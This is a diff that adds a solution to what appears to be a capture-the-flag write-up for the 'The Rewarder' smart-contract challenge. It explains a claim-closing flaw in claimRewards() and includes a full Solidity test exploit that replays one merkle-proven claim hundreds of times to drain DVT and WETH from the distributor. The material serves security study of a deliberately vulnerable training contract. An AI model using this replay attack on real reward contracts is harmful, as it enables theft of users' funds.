@@ -344,7 +344,131 @@ contract Attacker {
 
 ### Solution
 
-* ???
+If we call `claimRewards()` with a single claim, such as to `DVT`, the control is activated, closing the claim to prevent re-issuance.
+
+```solidity
+function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
+
+// SNIPPET...
+
+// In this case, this is the last claim of the array
+
+    if (i == inputClaims.length - 1) {
+        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+    }
+
+// SNIPPET...
+
+}
+```
+
+Now, when we call `claimRewards()` with two claims with different tokens, like `DVT` and then `WETH`, ...
+
+
+```solidity
+function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
+
+// SNIPPET...
+
+    for (uint256 i = 0; i < inputClaims.length; i++) {
+
+// In this control, the first time we run it, token is equal to 0,
+// which will be different from a deployed token address.
+// In the next iterations token is set at the value of the latest iteration.
+
+        if (token != inputTokens[inputClaim.tokenIndex]) {
+
+// This control takes you to close the claim of the latest iteration:
+// It is only skipped when the variable token is equal to zero.
+// This means that it is not active the first iteration.
+
+            if (address(token) != address(0)) {
+                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+            }
+
+// SNIPPET...
+
+        } else {
+
+// SNIPPET...
+
+        }
+
+ // The claim to WETH will be closed by this expression
+
+        if (i == inputClaims.length - 1) {
+            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+        }
+
+// SNIPPET...
+
+    }
+}
+```
+
+Then, if call `claimRewards()` with the same token, for example `DVT`, the condition `token != inputTokens[inputClaim.tokenIndex]` will not be true for all ther calls next to the first, therefore never closing the claim.
+
+We can issue then the valid merkle-verified call `n` times, until depleting (in a multiple of the claim amount) the contract.
+
+```solidity
+function test_theRewarder() public checkSolvedByPlayer {
+    // This is the player's address
+    // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+
+    // Get the address position in the files with:
+    /*
+      python3 -c "import json; \
+        data = json.load(open('./test/the-rewarder/dvt-distribution.json')); \
+        print(next((i for i, item in enumerate(data) if item['address'] == '0x44E97aF4418b7a17AABD8090bEA0A471a366305C'), None))"
+
+      python3 -c "import json; \
+        data = json.load(open('./test/the-rewarder/weth-distribution.json')); \
+        print(next((i for i, item in enumerate(data) if item['address'] == '0x44E97aF4418b7a17AABD8090bEA0A471a366305C'), None))"
+    */
+    // It's 188.
+    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+    // See 10000000000000000000 / 11524763827831882 = 867.696739767488
+    // See 1000000000000000000 / 1171088749244340 = 853.9062480493154
+    uint16 numberOfClaimsDVT = 867;
+    uint16 numberOfClaimsWETH = 853;
+
+    IERC20[] memory tokensToClaim = new IERC20[](2);
+    tokensToClaim[0] = IERC20(address(dvt));
+    tokensToClaim[1] = IERC20(address(weth));
+    Claim[] memory claims = new Claim[](numberOfClaimsDVT + numberOfClaimsWETH);
+
+    for (uint16 i = 0; i < numberOfClaimsDVT; i++) {
+        claims[i] = Claim({
+            batchNumber: 0,
+            amount: 11524763827831882, // See dvt-distribution.json
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 188)
+        });
+    }
+
+    for (
+        uint16 i = numberOfClaimsDVT;
+        i < numberOfClaimsDVT + numberOfClaimsWETH;
+        i++)
+    {
+        claims[i] = Claim({
+            batchNumber: 0,
+            amount: 1171088749244340, // See weth-distribution.json
+            tokenIndex: 1,
+            proof: merkle.getProof(wethLeaves, 188)
+        });
+    }
+
+    // Attack!
+    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+    // Send the funds to the recovery account.
+    dvt.transfer(recovery, dvt.balanceOf(player));
+    weth.transfer(recovery, weth.balanceOf(player));
+}
+```
 
 --------------------------------------------------------------------------------
 ## Template
